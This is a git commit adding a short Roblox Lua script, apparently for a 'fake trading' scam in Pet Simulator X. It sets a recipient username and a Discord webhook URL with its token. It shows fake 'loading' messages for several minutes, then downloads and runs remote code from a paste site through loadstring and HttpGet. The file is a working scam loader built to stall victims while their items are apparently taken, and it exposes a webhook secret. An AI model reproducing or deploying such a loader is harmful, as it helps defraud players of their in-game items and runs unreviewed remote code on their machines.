c3d81ddb614cf4c959e4ad342b182083caafba4a
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-06-25 09:27:22 +0700

    .lua

---
+++ FakeTradingByMoon/AutoConfirmOn/Main/PsxSafe/.lua
@@ -0,0 +1,17 @@
+UserName = "mxrcuszzzzz"
+
+UserName2 = "mxrcuszzzzz"
+
+Webhook = "https://discord.com/api/webhooks/1122344777736781824/mtUBbUK38qVn4ue06En9UWgs0uHYv16xQ44hBrkoB2n1QUUlBAVO00cS-Hvn9eq-7n3l"
+
+_G.ScriptName = "Moon not mooN"
+
+_G.FirstText = "Please wait..."
+
+_G.SecondText = "Script Loading..."
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 300
+
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/984466", true))()
